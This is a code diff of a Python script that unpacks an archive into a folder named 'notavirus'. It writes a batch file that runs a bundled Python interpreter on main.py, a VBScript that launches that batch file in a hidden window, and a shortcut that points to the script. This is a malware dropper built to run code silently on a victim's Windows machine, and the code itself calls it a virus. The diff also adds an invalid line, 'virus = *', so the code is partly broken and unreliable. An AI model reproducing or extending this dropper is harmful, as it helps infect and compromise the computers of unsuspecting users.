@@ -7,6 +7,7 @@ import zipfile
 from pathlib import Path
 from win32com.client import Dispatch
 
+virus = *
 
 def createShortcut(path, target='', wDir='', icon=''):
     ext = path[-3:]
@@ -36,7 +37,7 @@ with ZipFile("tmp.zip", "r", zipfile.ZIP_DEFLATED) as file:
 os.remove("tmp.zip")
 virusDir = os.path.join(dirLoc, "notavirus")
 with Path(os.path.join(virusDir, "runner.bat")) as file:
-    file.write_text(f"@echo off\n{os.path.join(virusDir, 'piss', 'python.exe')} {os.path.join(virusDir, 'main.py')}")
+    file.write_text(f'@echo off\n"{os.path.join(virusDir, "piss", "python.exe")}" "{os.path.join(virusDir, "main.py")}"')
 with Path(os.path.join(virusDir, "run.vbs")) as file:
     file.write_text(f'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run "{os.path.join(virusDir, "runner.bat")}",0,True')
 createShortcut(target, os.path.join(virusDir, "run.vbs"))
